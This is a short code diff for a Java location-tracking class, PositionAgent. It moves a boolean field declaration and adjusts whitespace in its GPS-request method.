@@ -78,6 +78,8 @@ public final class PositionAgent extends Agent implements LocationObserver {
 
     //Location loc = null;
 
+    boolean waitingForPoint = false;
+
     /**
      * Instantiates a new position agent.
      * 
@@ -315,8 +317,6 @@ public final class PositionAgent extends Agent implements LocationObserver {
 
     }
 
-    boolean waitingForPoint = false;
-
     private void locationGPS() {
         if (lp == null) {
             //#ifdef DEBUG
@@ -324,18 +324,18 @@ public final class PositionAgent extends Agent implements LocationObserver {
             //#endif               
             return;
         }
-
+    
         if (waitingForPoint) {
             //#ifdef DEBUG
             debug.trace("waitingForPoint");
             //#endif
             return;
         }
-
+    
         synchronized (this) {
             LocationHelper.getInstance().locationGPS(lp, this, false);
         }
-
+    
     }
 
     public synchronized void newLocation(Location loc) {
